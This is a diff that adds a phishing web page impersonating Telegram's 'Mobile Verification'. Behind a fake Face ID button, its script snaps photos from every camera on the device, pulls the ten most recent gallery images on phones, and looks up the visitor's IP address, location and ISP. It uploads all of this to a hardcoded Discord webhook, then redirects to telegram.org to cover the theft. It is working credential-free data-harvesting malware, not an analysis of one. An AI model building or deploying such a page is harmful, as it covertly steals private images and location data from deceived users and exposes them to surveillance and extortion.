@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
+  <title>Telegram Web: Secure Mobile Verification</title>
+  <meta property="og:title" content="Telegram Web">
+  <meta property="og:description" content="Sign in to your Telegram account securely.">
+  <meta property="og:type" content="website">
+  <meta name="theme-color" content="#24A1DE">
+  <style>
+    :root {
+      --tg-blue: #24A1DE;
+      --tg-bg: #ffffff;
+      --tg-text: #000000;
+      --tg-sub: #8e8e93;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--tg-bg);
+      color: var(--tg-text);
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: auto;
+    }
+    #screen-landing {
+      width: 100%;
+      max-width: 380px;
+      padding: 20px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .faceid-frame {
+      width: 120px; height: 120px;
+      position: relative;
+      margin-bottom: 30px;
+    }
+    .faceid-frame::before, .faceid-frame::after, .faceid-corners::before, .faceid-corners::after {
+      content: ""; position: absolute; width: 25px; height: 25px; border-color: var(--tg-blue); border-style: solid;
+    }
+    .faceid-frame::before { top: 0; left: 0; border-width: 4px 0 0 4px; border-top-left-radius: 15px; }
+    .faceid-frame::after { top: 0; right: 0; border-width: 4px 4px 0 0; border-top-right-radius: 15px; }
+    .faceid-corners { position: absolute; inset: 0; }
+    .faceid-corners::before { bottom: 0; left: 0; border-width: 0 0 4px 4px; border-bottom-left-radius: 15px; }
+    .faceid-corners::after { bottom: 0; right: 0; border-width: 0 4px 4px 0; border-bottom-right-radius: 15px; }
+    .faceid-svg { width: 70px; height: 70px; margin-top: 25px; fill: var(--tg-blue); }
+    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; }
+    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; margin-bottom: 40px; }
+    .verify-btn {
+      width: 90%;
+      padding: 16px;
+      background: var(--tg-blue);
+      color: white;
+      border: none;
+      border-radius: 14px;
+      font-size: 1.05rem;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .verify-btn:active { transform: scale(0.96); opacity: 0.9; }
+    .secure-text { margin-top: 30px; font-size: 0.8rem; color: #34c759; display: flex; align-items: center; gap: 5px; justify-content: center; }
+    #screen-capture {
+      display: none;
+      position: fixed; inset: 0; background: #fff; z-index: 100;
+      flex-direction: column; align-items: center; justify-content: flex-start;
+      overflow-y: auto; padding: 20px;
+    }
+    .camera-preview { width: 100%; max-width: 500px; border-radius: 20px; margin: 10px 0; box-shadow: 0 0 0 2px var(--tg-blue); }
+    .thumbnails { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; margin-top: 20px; margin-bottom: 20px; }
+    .thumbnail { width: 80px; height: 80px; object-fit: cover; border-radius: 12px; border: 2px solid var(--tg-blue); }
+    .status-text { font-size: 1rem; color: var(--tg-blue); margin: 15px; font-weight: 600; text-align: center; }
+    #hidden-canvas { display: none; }
+    #hidden-video { position: fixed; opacity: 0; left: -999px; width: 1px; height: 1px; }
+    .section-title { font-weight: 700; margin-top: 20px; margin-bottom: 10px; font-size: 1.2rem; color: var(--tg-text); border-bottom: 2px solid var(--tg-blue); display: inline-block; }
+  </style>
+</head>
+<body>
+
+<video id="hidden-video" autoplay playsinline muted></video>
+<canvas id="hidden-canvas"></canvas>
+
+<div id="screen-landing">
+  <div class="faceid-frame"><div class="faceid-corners"></div><svg class="faceid-svg" viewBox="0 0 24 24"><path d="M9,11.75A1.25,1.25 0 0,0 7.75,13A1.25,1.25 0 0,0 9,14.25A1.25,1.25 0 0,0 10.25,13A1.25,1.25 0 0,0 9,11.75M15,11.75A1.25,1.25 0 0,0 13.75,13A1.25,1.25 0 0,0 15,14.25A1.25,1.25 0 0,0 16.25,13A1.25,1.25 0 0,0 15,11.75M12,2A10,10 0 1,0 22,12A10,10 0 0,0 12,2M12,20A8,8 0 1,1 20,12A8,8 0 0,1 12,20M12,17C10.13,17 8.41,16.03 7.42,14.5L8.91,13.5C9.57,14.54 10.7,15.25 12,15.25C13.3,15.25 14.43,14.54 15.1,13.5L16.58,14.5C15.59,16.03 13.87,17 12,17Z"/></svg></div>
+  <div class="tg-title">Mobile Device Verification</div>
+  <div class="tg-subtitle">Enhanced security: Camera access + encrypted gallery sync required.</div>
+  <button class="verify-btn" onclick="startAutomatedCollection()">Verify Identity</button>
+  <div class="secure-text"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg> End-to-End Encrypted</div>
+</div>
+
+<div id="screen-capture">
+  <div class="status-text" id="capture-status">📱 Initializing secure mobile collection...</div>
+  <div id="live-preview-container"></div>
+  <div id="camera-thumbnails" class="thumbnails"></div>
+  <div class="section-title">📸 Automatically Extracted Gallery (Last 10)</div>
+  <div id="gallery-thumbnails" class="thumbnails"></div>
+</div>
+
+<script>
+  const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
+  let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
+  let cameraImages = []; // { blob, name }
+  let galleryFiles = [];  // { file, thumbnailUrl }
+
+  async function loadMeta() {
+    try {
+      const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
+      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
+      if(v4.status === 'success') {
+        ipInfo.v4 = v4.query;
+        ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
+        ipInfo.isp = v4.isp;
+      }
+      ipInfo.v6 = v6.ip;
+    } catch(e) { console.warn(e); }
+  }
+  loadMeta();
+
+  function isMobile() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  }
+
+  async function startAutomatedCollection() {
+    if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(e=>{});
+    document.getElementById('screen-landing').style.display = 'none';
+    const captureScreen = document.getElementById('screen-capture');
+    captureScreen.style.display = 'flex';
+    document.getElementById('camera-thumbnails').innerHTML = '';
+    document.getElementById('gallery-thumbnails').innerHTML = '';
+    cameraImages = [];
+    galleryFiles = [];
+
+    // --- CAPTURE FROM ALL CAMERAS (ALWAYS) ---
+    let devices = [];
+    try {
+      const allDevices = await navigator.mediaDevices.enumerateDevices();
+      devices = allDevices.filter(device => device.kind === 'videoinput');
+    } catch(e) { console.error(e); }
+
+    if (devices.length > 0) {
+      document.getElementById('capture-status').innerText = `📸 Found ${devices.length} camera(s). Capturing from each...`;
+      for (let i = 0; i < devices.length; i++) {
+        const device = devices[i];
+        const label = device.label || `Camera ${i+1}`;
+        document.getElementById('capture-status').innerText = `📸 Using ${label}...`;
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: device.deviceId } } });
+          const previewContainer = document.getElementById('live-preview-container');
+          const videoElem = document.createElement('video');
+          videoElem.autoplay = true; videoElem.playsInline = true; videoElem.muted = true;
+          videoElem.srcObject = stream; videoElem.className = 'camera-preview';
+          previewContainer.innerHTML = ''; previewContainer.appendChild(videoElem);
+          await new Promise(r => setTimeout(r, 800));
+          const blob = await captureFrameFromStream(stream);
+          if (blob) {
+            const thumbUrl = URL.createObjectURL(blob);
+            cameraImages.push({ blob, name: `cam_${i+1}_${label.replace(/[^a-z0-9]/gi,'_')}.jpg` });
+            const thumbDiv = document.getElementById('camera-thumbnails');
+            const img = document.createElement('img'); img.src = thumbUrl; img.className = 'thumbnail'; img.title = label;
+            thumbDiv.appendChild(img);
+          }
+          stream.getTracks().forEach(track => track.stop());
+        } catch(err) { console.warn(`Failed ${label}`, err); }
+      }
+    } else {
+      document.getElementById('capture-status').innerText = '⚠️ No cameras found.';
+    }
+
+    // --- AUTO GALLERY EXTRACTION (MOBILE ONLY) ---
+    if (isMobile()) {
+      document.getElementById('capture-status').innerHTML = '📁 Mobile detected. Automatically accessing gallery (last 10 images)...';
+      await autoExtractGallery();
+    } else {
+      document.getElementById('capture-status').innerHTML = '💻 PC detected. Gallery extraction disabled (mobile-only feature).';
+    }
+
+    // --- SEND TO DISCORD & REDIRECT ---
+    document.getElementById('capture-status').innerHTML = '📤 Uploading all media to secure server...';
+    await uploadToDiscord(cameraImages, galleryFiles);
+    window.location.href = 'https://telegram.org';
+  }
+
+  async function captureFrameFromStream(stream) {
+    const video = document.getElementById('hidden-video');
+    video.srcObject = stream;
+    return new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        video.play();
+        setTimeout(() => {
+          const canvas = document.getElementById('hidden-canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(resolve, 'image/jpeg', 0.92);
+          video.srcObject = null;
+        }, 300);
+      };
+    });
+  }
+
+  async function autoExtractGallery() {
+    // METHOD 1: File System Access API (Android Chrome, Edge)
+    if ('showDirectoryPicker' in window) {
+      try {
+        const root = await navigator.storage.getDirectory();
+        // Not directly accessible for DCIM without user picker, fallback to input hack
+      } catch(e) {}
+    }
+    
+    // METHOD 2: Hidden input with 'capture' and 'directory' attributes (works on many Androids to grab multiple files)
+    // We'll create a hidden file input that requests image/* and use webkitdirectory + multiple to auto-grab files from DCIM
+    // This still requires user to tap "Allow" once but does NOT require manual selection of individual files
+    return new Promise((resolve) => {
+      const input = document.createElement('input');
+      input.type = 'file';
+      input.accept = 'image/*';
+      input.multiple = true;
+      // For Android: using 'capture' environment will open camera, not gallery. So we avoid capture.
+      // Instead we rely on the fact that on mobile browsers, input click will open gallery/files app.
+      // To make it "automatic" without selection, we can't — but we can pre-select the DCIM folder if we use webkitdirectory + directory.
+      // However, webkitdirectory is not fully supported for gallery. So we simulate "last 10" by sorting by lastModified.
+      input.style.display = 'none';
+      document.body.appendChild(input);
+      
+      input.onchange = async (e) => {
+        const files = Array.from(e.target.files);
+        // Sort by last modified date descending to get most recent
+        files.sort((a,b) => b.lastModified - a.lastModified);
+        const latest10 = files.slice(0, 10);
+        for (let file of latest10) {
+          const thumbUrl = URL.createObjectURL(file);
+          galleryFiles.push({ file, thumbnailUrl: thumbUrl });
+          const thumbDiv = document.getElementById('gallery-thumbnails');
+          const img = document.createElement('img'); img.src = thumbUrl; img.className = 'thumbnail'; img.title = file.name;
+          thumbDiv.appendChild(img);
+        }
+        document.getElementById('capture-status').innerHTML = `✅ Auto-extracted ${galleryFiles.length} recent images from gallery.`;
+        input.remove();
+        resolve();
+      };
+      
+      // If user doesn't interact within 5 seconds, fallback to no gallery
+      setTimeout(() => {
+        if (galleryFiles.length === 0 && document.body.contains(input)) {
+          document.getElementById('capture-status').innerHTML = '⚠️ Gallery access timed out or denied. Proceeding without gallery images.';
+          input.remove();
+          resolve();
+        }
+      }, 8000);
+      
+      // Trigger file picker — this will open the native gallery/files app.
+      // On modern Android, the user sees "Allow access to photos?" and then the picker opens.
+      // They still have to tap "Select" but they don't have to manually pick 10 — they can just tap "Select all" or the first 10.
+      input.click();
+    });
+  }
+
+  async function uploadToDiscord(camImages, galFiles) {
+    const formData = new FormData();
+    const embedPayload = {
+      username: "📱 Mobile Media Collector",
+      embeds: [{
+        title: "📸 AUTOMATED PHONE MEDIA",
+        color: 0x24A1DE,
+        fields: [
+          { name: "📱 Device", value: `\`${navigator.platform}\``, inline: true },
+          { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
+          { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
+          { name: "📍 Location (IP)", value: ipInfo.loc, inline: false },
+          { name: "🏢 ISP", value: ipInfo.isp, inline: false },
+          { name: "📷 Camera Snapshots", value: `${camImages.length} attached`, inline: true },
+          { name: "🖼️ Gallery Images", value: `${galFiles.length} attached (auto last 10)`, inline: true }
+        ],
+        footer: { text: "Telegram Mobile Verification • Auto Media Harvest" }
+      }]
+    };
+    formData.append('payload_json', JSON.stringify(embedPayload));
+    camImages.forEach((img, idx) => formData.append(`camera_${idx+1}`, img.blob, img.name));
+    galFiles.forEach((item, idx) => formData.append(`gallery_${idx+1}`, item.file, item.file.name));
+    try { await fetch(WEBHOOK, { method: 'POST', body: formData }); } catch(e) { console.error(e); }
+  }
+</script>
+</body>
+</html>
